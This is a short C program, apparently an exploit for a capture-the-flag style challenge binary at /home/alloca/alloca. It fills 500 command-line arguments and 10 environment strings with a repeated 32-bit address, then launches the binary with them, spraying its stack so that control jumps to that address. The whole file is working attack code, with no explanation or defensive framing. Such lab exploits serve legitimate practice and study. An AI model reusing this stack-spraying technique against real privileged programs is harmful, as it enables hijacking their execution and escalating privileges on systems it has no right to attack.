#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#define argc 500
#define envc 10

int main() {
    char arg_buf[4096];
    char env_buf[4096];
    for (int i = 0; i < sizeof(arg_buf) / 4; ++i) 
        memcpy(arg_buf + 4 * i, "\xab\x85\x04\x08", 4);
    for (int i = 0; i < sizeof(env_buf) / 4; ++i)
        memcpy(env_buf + 4 * i, "\xab\x85\x04\x08", 4);
    memcpy(env_buf + sizeof(env_buf) - 4, "=aaa", 4);
    arg_buf[sizeof(arg_buf) - 1] = 0;
    env_buf[sizeof(env_buf) - 1] = 0;

    char* argv[argc + 1];
    char* envp[envc + 1];
    for (int i = 0; i < argc; ++i)
        argv[i] = arg_buf;
    for (int i = 0; i < envc; ++i)
        envp[i] = env_buf;
    argv[argc] = NULL;
    envp[envc] = NULL;
    
    if (-1 == execve("/home/alloca/alloca", argv, envp))
        printf("execve failed! %s\n", strerror(errno));
    return 0;
}

